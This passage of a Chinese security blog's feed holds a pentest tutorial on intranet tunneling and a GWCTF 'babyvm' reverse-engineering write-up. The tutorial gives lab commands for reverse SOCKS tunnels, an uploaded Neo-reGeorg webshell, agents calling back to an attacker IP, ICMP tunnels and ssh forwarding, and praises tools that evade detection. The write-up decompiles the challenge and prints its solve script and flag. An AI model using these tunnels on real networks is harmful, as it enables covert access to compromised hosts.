href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">Fastjson反序列化漏洞基础</a></p><p><a href="https://paper.seebug.org/1192/">Fastjson 反序列化漏洞史</a></p><p><a href="https://xz.aliyun.com/t/7878">某json &lt;= 1.2.68 远程代码执行漏洞分析</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透</title>
      <link href="/2021/05/12/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2021/05/12/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录内网穿透的一些知识</p></blockquote><span id="more"></span><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>内网穿透</strong></p><p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p><p><strong>隧道技术</strong></p><p>隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p><p><strong>隧道分类</strong></p><ul><li>网络层隧道：ICMP等</li><li>传输层隧道：TCP、UDP等</li><li>应用层隧道：HTTP、DNS、SSH、RDP等</li></ul><p><strong>实战环境</strong></p><p>在实战环境中，我们要考虑目标机器的出入网情况，有可能只允许ICMP出入网，抑或是只允许HTTP出网，我们需要视特定情况选择对应的隧道，选择反弹shell、代理或者端口转发，选择正向代理或者反向代理等等。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>目标机器：</p><ul><li>Win7</li><li>192.168.22.3（内）</li><li>192.168.33.4（外）</li></ul><p>攻击机器：</p><ul><li>Linux</li><li>192.168.44.5（外）</li></ul><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><blockquote><p><a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p><p>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用</p></blockquote><h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><blockquote><p><a href="https://github.com/DhavalKapil/icmptunnel">https://github.com/DhavalKapil/icmptunnel</a></p><p>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用</p></blockquote><h3 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h3><blockquote><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p><p>tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</p></blockquote><p>攻击机上：</p><pre><code class="shell"># (可选)关闭系统默认的 pingecho 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all./pingtunnel -type server -noprint 1 -nolog 1</code></pre><p>目标机上：</p><pre><code class="shell"># 转发TCPpingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -t server_ip:7777 -tcp 1 -noprint 1 -nolog 1# 转发sock5pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -tcp 1 -noprint 1 -nolog 1</code></pre><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><blockquote><p><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>网络工具中的瑞士军刀，不多介绍，linux系统一般自带</p></blockquote><h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><blockquote><p><a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><p>powershell版的netcat</p></blockquote><h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><blockquote><p><a href="https://github.com/3ndG4me/socat">https://github.com/3ndG4me/socat</a></p><p>具有记录转发流的功能，方便查看转发内容，需要安装</p></blockquote><h3 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h3><blockquote><p>windows系统自带的网络配置工具</p></blockquote><h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h3><blockquote><p><a href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a></p><p>端口转发工具</p></blockquote><h3 id="NATBypass"><a href="#NATBypass" class="headerlink" title="NATBypass"></a>NATBypass</h3><blockquote><p><a href="https://github.com/cw1997/NATBypass">https://github.com/cw1997/NATBypass</a></p><p>一款lcx在golang下的实现，更好的跨平台，更完善的文档</p></blockquote><h3 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h3><blockquote><p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><p>端口转发 &amp; 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。</p><p>缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p></blockquote><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><blockquote><p><a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a></p><p>十分方便的多级SOCKS代理，已经永久停止更新</p></blockquote><p><strong>正向连接</strong></p><p>目标机上：</p><pre><code class="shell">ew_for_Win.exe -s ssocksd -l 888</code></pre><p><strong>反向连接</strong></p><p>攻击机上：</p><pre><code class="shell">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</code></pre><p>目标机上：</p><pre><code class="shell">ew_for_Win.exe -s rssocks -d 192.168.44.5 -e 1234</code></pre><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><blockquote><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃</p></blockquote><p>攻击机上：</p><pre><code class="shell">python neoreg.py generate -k 123456</code></pre><p>上传对应的<code>tunnel.(aspx|ashx|jsp|php)</code>文件到目标机上</p><p>攻击机上：</p><pre><code class="shell">python3 neoreg.py -k 123456 -u http://192.168.33.4/tunnel.php</code></pre><h3 id="venom"><a href="#venom" class="headerlink" title="venom"></a>venom</h3><blockquote><p><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</p></blockquote><p>攻击机上：</p><pre><code class="shell">./admin_linux_x64 -lport 9999</code></pre><p>目标机上：</p><pre><code class="shell">agent.exe -rhost 192.168.44.5 -rport 9999</code></pre><p>攻击机上：</p><pre><code class="shell">showgoto 1socks 6666</code></pre><h3 id="ssf"><a href="#ssf" class="headerlink" title="ssf"></a>ssf</h3><blockquote><p><a href="https://github.com/securesocketfunneling/ssf">https://github.com/securesocketfunneling/ssf</a></p><p>支持TLS隧道</p></blockquote><p><strong>正向连接</strong></p><p>把certs文件夹和ssfd上传到目标机上</p><p>目标机上：</p><pre><code class="shell">ssfd.exe ‐p 1333</code></pre><p>攻击机上：</p><pre><code class="shell">./ssfd ‐D 1222 ‐p 1333 192.168.33.4</code></pre><p><strong>反向连接</strong></p><p>攻击机上：</p><pre><code class="shell">./ssfd ‐p 1234</code></pre><p>目标机上：</p><pre><code class="shell">ssf.exe ‐F 12345 ‐p 1234 192.168.44.5</code></pre><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><blockquote><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>支持 TCP、UDP、HTTP、HTTPS 等多种协议</p></blockquote><p>攻击机上配置frps.ini</p><pre><code class="shell">[common]bind_port = 6666</code></pre><p>攻击机上：</p><pre><code class="shell">./frps -c frps.ini</code></pre><p>目标及配置frpc.ini</p><pre><code class="shell">[common]server_addr = 192.168.33.4server_port = 6666[http_proxy]type=tcpremote_port=7777plugin=socks5</code></pre><p>目标机上：</p><pre><code class="shell">frpc.exe -c frpc.ini</code></pre><h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><blockquote><p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>可支持任何tcp、udp上层协议，还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端</p></blockquote><h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><blockquote><p><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p><p>不仅可以创建DNS隧道，更是C2</p></blockquote><h3 id="dnscat2-powershell"><a href="#dnscat2-powershell" class="headerlink" title="dnscat2-powershell"></a>dnscat2-powershell</h3><blockquote><p><a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p><p>dnscat2的powershell客户端</p></blockquote><h3 id="dns2tcp"><a href="#dns2tcp" class="headerlink" title="dns2tcp"></a>dns2tcp</h3><blockquote><p><a href="https://github.com/alex-sector/dns2tcp">https://github.com/alex-sector/dns2tcp</a></p><p>TCP over DNS，即通过DNS隧道转发TCP连接</p></blockquote><h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><blockquote><p><a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p><p>IPv4 over DNS，即通过DNS隧道转发IPv4数据包</p></blockquote><h3 id="reDuh"><a href="#reDuh" class="headerlink" title="reDuh"></a>reDuh</h3><blockquote><p><a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></p><p>TCP over HTTP，即通过HTTP隧道转发TCP连接，隧道不稳定</p></blockquote><h3 id="Tunna"><a href="#Tunna" class="headerlink" title="Tunna"></a>Tunna</h3><blockquote><p><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></p><p>TCP、SOCKS over HTTP，即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定</p></blockquote><h3 id="ABPTTS"><a href="#ABPTTS" class="headerlink" title="ABPTTS"></a>ABPTTS</h3><blockquote><p><a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p><p>TCP over HTTP，即通过HTTP隧道转发TCP连接，数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp</p></blockquote><h3 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h3><blockquote><p><a href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></p><p>EarthWorm的升级版，已经永久停止更新</p></blockquote><h3 id="ssocks"><a href="#ssocks" class="headerlink" title="ssocks"></a>ssocks</h3><blockquote><p><a href="https://github.com/54Pany/sSocks">https://github.com/54Pany/sSocks</a></p><p>正向和反向的socks工具，可执行文件的大小很小</p></blockquote><h3 id="s5-go"><a href="#s5-go" class="headerlink" title="s5.go"></a>s5.go</h3><blockquote><p><a href="https://github.com/ring04h/s5.go">https://github.com/ring04h/s5.go</a></p><p>go语言编写的socks服务工具，良好的跨平台特性</p></blockquote><h3 id="bridge"><a href="#bridge" class="headerlink" title="bridge"></a>bridge</h3><blockquote><p><a href="https://github.com/luizluca/bridge">https://github.com/luizluca/bridge</a></p><p>基于http协议的端口转发</p></blockquote><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><blockquote><p>这里分享个小技巧，如果已经连上了ssh，可以输入~C来执行ssh命令</p></blockquote><p>本地端口转发：</p><blockquote><pre><code class="shell">-L 本地网卡地址:本地端口:目标地址:目标端口</code></pre></blockquote><pre><code class="shell">ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1# 或者省略本地网卡地址ssh -CNfg -L 7777:114.114.114.114:9999 root@192.168.1.1# ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到114.114.114.114:9999# 即本地机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问远程的114.114.114.114:9999</code></pre><p>远程端口转发：</p><blockquote><pre><code class="shell">-R 远程网卡地址:远程端口:目标地址:目标端口</code></pre></blockquote><pre><code class="shell">ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1# 或者省略远程网卡地址ssh -CNfg -R 7777:114.114.114.114:9999 root@192.168.1.1# ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999# 即远程机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问本地的114.114.114.114:9999</code></pre><p>动态端口转发：</p><blockquote><pre><code class="shell">-D 本地网卡地址:本地端口</code></pre></blockquote><pre><code class="shell">ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1# ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址# 即远程机器在设置127.0.0.1:7777的socks5代理后可以通过192.168.1.1的ssh隧道访问本地服务</code></pre><p>构建ssh隧道的常用参数:</p><pre><code class="shell">-C 压缩传输，提高传输速度-f 后台执行数据传输-N 建立静默连接-g 允许远程主机连接本地用于转发的端口-L 本地端口转发-R 远程端口转发-D 动态转发，即SOCKS代理-p 指定ssh连接端口</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/9454">内网穿透的n种姿势</a></p><p><a href="https://xz.aliyun.com/t/7701">内网渗透之内网穿透</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Penertration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyvm-vm逆向</title>
      <link href="/2021/03/28/babyvm-vm%E9%80%86%E5%90%91/"/>
      <url>/2021/03/28/babyvm-vm%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目源于【GWCTF 2019】，考点为vm逆向</p></blockquote><p>记录一道比较典型的vm题</p><span id="more"></span><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a><strong>主函数</strong></h4><p>程序主函数如下，下面我们对调用到的3个函数进行分析</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021032802545d24aa8308413d2dccd8.png" alt="image-20210327233354971"></p><h4 id="vm自定义方法"><a href="#vm自定义方法" class="headerlink" title="vm自定义方法"></a><strong>vm自定义方法</strong></h4><p><code>sub_55BE054DCCD1()</code>函数用于存储需要调用到的方法，也可以观察到每调用完一次操作，a1就会自增跳到下一个命令，类似RIP功能</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DCCD1(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  *(_DWORD *)a1 = 0;  *(_DWORD *)(a1 + 4) = 0x12;  *(_DWORD *)(a1 + 8) = 0;  *(_DWORD *)(a1 + 12) = 0;  *(_QWORD *)(a1 + 16) = &amp;unk_55BE056DE060;  *(_BYTE *)(a1 + 24) = 0xF1;  *(_QWORD *)(a1 + 32) = sub_55BE054DCB5F;  *(_BYTE *)(a1 + 40) = 0xF2;  *(_QWORD *)(a1 + 48) = sub_55BE054DCA64;  *(_BYTE *)(a1 + 56) = 0xF5;  *(_QWORD *)(a1 + 64) = sub_55BE054DCAC5;  *(_BYTE *)(a1 + 72) = 0xF4;  *(_QWORD *)(a1 + 80) = sub_55BE054DC956;  *(_BYTE *)(a1 + 88) = 0xF7;  *(_QWORD *)(a1 + 96) = sub_55BE054DCA08;  *(_BYTE *)(a1 + 104) = 0xF8;  *(_QWORD *)(a1 + 112) = sub_55BE054DC8F0;  *(_BYTE *)(a1 + 120) = 0xF6;  *(_QWORD *)(a1 + 128) = sub_55BE054DC99C;  qword_55BE056DE2A8 = malloc(0x512uLL);  memset(qword_55BE056DE2A8, 0, 0x512uLL);  return __readfsqword(0x28u) ^ v2;&#125;</code></pre><p>选择置换</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DCB5F(__int64 a1)&#123;  int *v2; // [rsp+28h] [rbp-18h]  unsigned __int64 v3; // [rsp+38h] [rbp-8h]  v3 = __readfsqword(0x28u);  v2 = (int *)(*(_QWORD *)(a1 + 16) + 2LL);  switch ( *(_BYTE *)(*(_QWORD *)(a1 + 16) + 1LL) )  &#123;    case 0xE1:      *(_DWORD *)a1 = *((char *)qword_55BE056DE2A8 + *v2);      break;    case 0xE2:      *(_DWORD *)(a1 + 4) = *((char *)qword_55BE056DE2A8 + *v2);      break;    case 0xE3:      *(_DWORD *)(a1 + 8) = *((char *)qword_55BE056DE2A8 + *v2);      break;    case 0xE4:      *((_BYTE *)qword_55BE056DE2A8 + *v2) = *(_DWORD *)a1;      break;    case 0xE5:      *(_DWORD *)(a1 + 12) = *((char *)qword_55BE056DE2A8 + *v2);      break;    case 0xE7:      *((_BYTE *)qword_55BE056DE2A8 + *v2) = *(_DWORD *)(a1 + 4);      break;    default:      break;  &#125;  *(_QWORD *)(a1 + 16) += 6LL;  return __readfsqword(0x28u) ^ v3;&#125;</code></pre><p>异或</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DCA64(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  *(_DWORD *)a1 ^= *(_DWORD *)(a1 + 4);  ++*(_QWORD *)(a1 + 16);  return __readfsqword(0x28u) ^ v2;&#125;</code></pre><p>读取数据，并且限制长度为21</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DCAC5(__int64 a1)&#123;  const char *buf; // [rsp+10h] [rbp-10h]  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  buf = (const char *)qword_55BE056DE2A8;  read(0, qword_55BE056DE2A8, 0x20uLL);  dword_55BE056DE2A4 = strlen(buf);  if ( dword_55BE056DE2A4 != 21 )  &#123;    puts(&quot;WRONG!&quot;);    exit(0);  &#125;  ++*(_QWORD *)(a1 + 16);  return __readfsqword(0x28u) ^ v3;&#125;</code></pre><p>无操作</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DC956(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  ++*(_QWORD *)(a1 + 16);  return __readfsqword(0x28u) ^ v2;&#125;</code></pre><p>乘法</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DCA08(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  *(_DWORD *)a1 *= *(_DWORD *)(a1 + 12);  ++*(_QWORD *)(a1 + 16);  return __readfsqword(0x28u) ^ v2;&#125;</code></pre><p>交换</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DC8F0(int *a1)&#123;  int v2; // [rsp+14h] [rbp-Ch]  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  v2 = *a1;  *a1 = a1[1];  a1[1] = v2;  ++*((_QWORD *)a1 + 2);  return __readfsqword(0x28u) ^ v3;&#125;</code></pre><p>加法</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DC99C(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  *(_DWORD *)a1 = *(_DWORD *)(a1 + 8) + 2 * *(_DWORD *)(a1 + 4) + 3 * *(_DWORD *)a1;  ++*(_QWORD *)(a1 + 16);  return __readfsqword(0x28u) ^ v2;&#125;</code></pre><h4 id="加密操作1"><a href="#加密操作1" class="headerlink" title="加密操作1"></a><strong>加密操作</strong>1</h4><p><code>sub_55BE054DCE0B()</code>函数根据<code>unk_55BE056DE060</code>给出的opcode对a1进行加密，知道操作码等于<code>0xF4</code>为止</p><p>下面我们需要对opcode进行分析，也是我们解题中最关键的一步</p><pre><code class="c">unsigned __int64 __fastcall sub_55BE054DCE0B(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  *(_QWORD *)(a1 + 16) = &amp;unk_55BE056DE060;  while ( **(_BYTE **)(a1 + 16) != 0xF4 )    sub_55BE054DCE6E(a1);  return __readfsqword(0x28u) ^ v2;&#125;</code></pre><p>根据地址选取指令对a1进行操作</p><pre><code class="c">unsigned __int64 __fastcall sub_556FD909DE6E(__int64 a1)&#123;  int i; // [rsp+14h] [rbp-Ch]  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  for ( i = 0; **(_BYTE **)(a1 + 16) != *(_BYTE *)(16 * (i + 1LL) + a1 + 8); ++i )    ;  (*(void (__fastcall **)(__int64))(16 * (i + 1LL) + a1 + 16))(a1);  return __readfsqword(0x28u) ^ v3;&#125;</code></pre><p>把opcode截取到0xF4（在这里你会发现有两段F5-F4），结合动态调试分析，其实一个简单的异或循环，虽然这里写进<code>input[0x20]</code>显得有点奇怪，但是只要看一下<strong>密文对比1</strong>那部分就知道其实这里存储的就是加密后的结果</p><pre><code class="c">F5 // readF1 E1 00 00 00 00 F2 F1 E4 20 00 00 00 // input[0x20] = input[0] ^ a1[1]F1 E1 01 00 00 00  F2 F1 E4 21 00 00 00 // input[0x21] = input[0x01] ^ a1[1]F1 E1 02 00 00 00 F2  F1 E4 22 00 00 00 // input[0x22] = input[0x02] ^ a1[1]F1 E1 03 00 00 00 F2 F1 E4 23 00 00 00 // input[0x23] = input[0x03] ^ a1[1]F1 E1 04 00 00 00 F2 F1 E4 24 00 00 00 // input[0x24] = input[0x04] ^ a1[1]F1 E1 05 00 00 00 F2 F1 E4 25 00 00 00 // input[0x25] = input[0x05] ^ a1[1]F1 E1 06 00 00 00 F2 F1 E4 26 00 00 00 // input[0x26] = input[0x06] ^ a1[1]F1 E1 07 00 00 00 F2 F1 E4 27 00 00 00 // input[0x27] = input[0x07] ^ a1[1]F1 E1 08 00 00 00 F2 F1 E4 28 00 00 00 // input[0x28] = input[0x08] ^ a1[1]F1 E1 09 00 00 00 F2 F1 E4 29 00 00 00 // input[0x29] = input[0x09] ^ a1[1]F1 E1 0A 00 00 00 F2 F1 E4 2A 00 00 00 // input[0x2A] = input[0x0A] ^ a1[1]F1 E1 0B 00 00 00 F2 F1 E4 2B 00 00 00 // input[0x2B] = input[0x0B] ^ a1[1]F1 E1 0C 00 00 00 F2 F1 E4 2C 00 00 00 // input[0x2C] = input[0x0C] ^ a1[1]F1 E1 0D 00 00 00 F2 F1 E4 2D 00 00 00 // input[0x2D] = input[0x0D] ^ a1[1]F1 E1 0E 00 00 00 F2 F1 E4 2E 00 00 00 // input[0x2E] = input[0x0E] ^ a1[1]F1 E1 0F 00 00 00 F2 F1 E4 2F 00 00 00 // input[0x2F] = input[0x0F] ^ a1[1]F1 E1 10 00 00 00 F2 F1 E4 30 00 00 00 // input[0x30] = input[0x10] ^ a1[1]F1 E1 11 00 00 00 F2 F1 E4 31 00 00 00 // input[0x31] = input[0x11] ^ a1[1]F1 E1 12 00 00 00 F2 F1 E4 32 00 00 00 // input[0x32] = input[0x12] ^ a1[1]F1 E1 13 00 00 00 F2 F1 E4 33 00 00 00 // input[0x33] = input[0x13] ^ a1[1]F4 // ret</code></pre><blockquote><p>a1[1]就是之前存储的<code>*(_DWORD *)(a1 + 4) = 0x12;</code></p></blockquote><h4 id="密文比较1"><a href="#密文比较1" class="headerlink" title="密文比较1"></a><strong>密文比较1</strong></h4><p><code>sub_55BE054DCF83()</code>函数与<code>aFzAmAmFmtSum</code>的指针值（其实就是我们的input）进行比较</p><pre><code class="c">unsigned __int64 sub_55BE054DCF83()&#123;  int i; // [rsp+Ch] [rbp-14h]  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  for ( i = 0; dword_55BE056DE2A4 - 1 &gt; i; ++i )  &#123;    if ( *((_BYTE *)qword_55BE056DE2A8 + i + 0x20) != aFzAmAmFmtSum[i] )    &#123;      puts(&quot;WRONG!&quot;);      exit(0);    &#125;  &#125;  puts(&quot;Congratulation?&quot;);  puts(&quot;tips: input is the start&quot;);  return __readfsqword(0x28u) ^ v2;&#125;</code></pre><p>直接用这个值<code>aFzAmAmFmtSum</code>解密发现是假flag</p><pre><code class="python">print(&#39;[+] flag:&#39;, &#39;&#39;.join([chr(ord(_)^0x12) for _ in &#39;Fz&#123;aM&#123;aM|&#125;fMt~suM !!&#39;]))# [+] flag: This_is_not_flag_233</code></pre><h4 id="密文比较2"><a href="#密文比较2" class="headerlink" title="密文比较2"></a>密文比较2</h4><p>在假flag上面有一个疑似密文的<code>byte_556FD929F020</code>数据，交叉引用到<code>sub_556FD909DF00()</code>中找到了另外一段密文比较</p><pre><code class="c">unsigned __int64 sub_556FD909DF00()&#123;  int i; // [rsp+Ch] [rbp-14h]  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  for ( i = 0; dword_556FD929F2A4 - 1 &gt; i; ++i )  &#123;    if ( *((_BYTE *)qword_556FD929F2A8 + i) != byte_556FD929F020[i] )      exit(0);  &#125;  return __readfsqword(0x28u) ^ v2;&#125;</code></pre><h4 id="加密操作2"><a href="#加密操作2" class="headerlink" title="加密操作2"></a>加密操作2</h4><p>在上面进行加密操作1的时候我们发现还有第二段opcode，那我们尝试分析一下</p><pre><code class="c">F5 // readF1 E1 00 00 00 00 F1 E2 01 00 00 00 F2 F1 E4 00 00 00 00 // input[0] = input[0] ^ input[0x01]F1 E1 01 00 00 00 F1 E2 02 00 00 00 F2 F1 E4 01 00 00 00 // input[0x01] = input[0x01] ^ input[0x02]F1 E1 02 00 00 00 F1 E2 03 00 00 00 F2 F1 E4 02 00 00 00 // input[0x02] = input[0x02] ^ input[0x03]F1 E1 03 00 00 00 F1 E2 04 00 00 00 F2 F1 E4 03 00 00 00 // input[0x03] = input[0x03] ^ input[0x04]F1 E1 04 00 00 00 F1 E2 05 00 00 00 F2 F1 E4 04 00 00 00 // input[0x04] = input[0x04] ^ input[0x05]F1 E1 05 00 00 00 F1 E2 06 00 00 00 F2 F1 E4 05 00 00 00 // input[0x05] = input[0x05] ^ input[0x06]F1 E1 06 00 00 00 F1 E2 07 00 00 00 F1 E3 08 00 00 00 F1 E5 0C 00 00 00 F6 F7 F1 E4 06 00 00 00 // input[0x06] = (input[0x08] + 2 ** input[0x07] + 3 ** input[0x06]) * input[0x0C]F1 E1 07 00 00 00 F1 E2 08 00 00 00 F1 E3 09 00 00 00 F1 E5 0C 00 00 00 F6 F7 F1 E4 07 00 00 00 // input[0x07] = (input[0x09] + 2 ** input[0x08] + 3 ** input[0x07]) * input[0x0C]F1 E1 08 00 00 00 F1 E2 09 00 00 00 F1 E3 0A 00 00 00 F1 E5 0C 00 00 00 F6 F7 F1 E4 08 00 00 00 // input[0x08] = (input[0x0A] + 2 ** input[0x09] + 3 ** input[0x08]) * input[0x0C]F1 E1 0D 00 00 00 F1 E2 13 00 00 00 F8 F1 E4 0D 00 00 00 F1 E7 13 00 00 00 // input[0x0D], input[0x13] = input[0x13], input[0x0D]F1 E1 0E 00 00 00 F1 E2 12 00 00 00 F8 F1 E4 0E 00 00 00 F1 E7 12 00 00 00 // input[0x0E], input[0x12] = input[0x12], input[0x0E]F1 E1 0F 00 00 00 F1 E2 11 00 00 00 F8 F1 E4 0F 00 00 00 F1 E7 11 00 00 00 // input[0x0F], input[0x11] = input[0x11], input[0x0F]F4 // ret</code></pre><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>直接逆向上面的操作就好</p><pre><code class="python">from z3 import *import reflag = &#39;69 45 2A 37 09 17 C5 0B 5C 72 33 76 33 21 74 31 5F 33 73 72&#39;.split(&#39; &#39;)flag = [int(_, 16) for _ in flag]# 置换flag[15], flag[17] = flag[17], flag[15]flag[14], flag[18] = flag[18], flag[14]flag[19], flag[13] = flag[13], flag[19]# z3a6, a7, a8 = BitVecs(&#39;a6 a7 a8&#39;, 8)s = Solver()s.add(flag[6] == (a8 + 2 * a7 + 3 * a6) * flag[12])s.add(flag[7] == (flag[9]  + 2 * a8 + 3 * a7) * flag[12])s.add(flag[8] == (flag[10] + 2 * flag[9] + 3 * a8) * flag[12])if s.check() == sat:    m = s.model()    for i in m:        index = int(re.search(r&#39;\d+&#39;, str(i)).group())        flag[index] = m[i].as_long()# 异或for i in range(5, -1, -1):    flag[i] ^= flag[i + 1]print(&#39;[+] flag: &#39;, &#39;&#39;.join([chr(_) for _ in flag]))# [+] flag:  Y0u_hav3_r3v3rs3_1t!</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Login-py反编译</title>
      <link href="/2021/03/27/Login-py%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
      <url>/2021/03/27/Login-py%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
      
